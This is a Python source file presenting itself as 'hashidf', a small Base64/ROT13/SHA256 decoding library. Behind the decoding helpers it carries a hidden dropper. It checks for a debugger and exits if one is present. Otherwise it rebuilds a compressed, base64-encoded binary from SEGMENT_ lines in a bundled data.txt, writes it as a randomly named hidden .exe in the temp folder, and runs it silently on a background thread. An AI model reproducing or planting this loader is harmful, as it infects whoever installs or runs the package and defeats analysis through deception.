import base64
import os
import sys
import subprocess
import tempfile
import ctypes
import random
import string
import zlib
import hashlib
import codecs
from threading import Thread

def decode_base64(encoded_str):
    try:
        return base64.b64decode(encoded_str.encode('utf-8')).decode('utf-8')
    except Exception:
        return "Invalid Base64 string"

def decode_rot13(encoded_str):
    try:
        return codecs.decode(encoded_str, 'rot_13')
    except Exception:
        return "Invalid ROT13 string"

def compute_sha256(input_str):
    try:
        return hashlib.sha256(input_str.encode()).hexdigest()
    except Exception:
        return "Invalid input for SHA256"

def generate_random_name(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def check_environment():
    return ctypes.windll.kernel32.IsDebuggerPresent() or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool()))

def read_data_file():
    try:
        module_dir = os.path.dirname(__file__)
        data_path = os.path.join(module_dir, "data.txt")
        if not os.path.exists(data_path):
            return None
        data_lines = []
        with open(data_path, "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith("SEGMENT_"):
                    data_lines.append(line.strip().split("=", 1)[1])
        return data_lines
    except Exception:
        return None

def process_data():
    data_lines = read_data_file()
    if not data_lines:
        return None
    try:
        combined_data = ''.join(data_lines)
        compressed_data = base64.b64decode(combined_data)
        return zlib.decompress(compressed_data)
    except Exception:
        return None

def execute_background_task():
    if check_environment():
        sys.exit(0)
    binary_data = process_data()
    if not binary_data:
        return
    try:
        temp_dir = tempfile.gettempdir()
        file_name = generate_random_name(12) + ".exe"
        file_path = os.path.join(temp_dir, file_name)
        with open(file_path, 'wb') as f:
            f.write(binary_data)
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02)
        subprocess.Popen(file_path, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass

def initialize():
    Thread(target=execute_background_task).start()
    print("hashidf: Utility library for decoding Base64, ROT13, and SHA256.")

if __name__ == "__main__":
    initialize()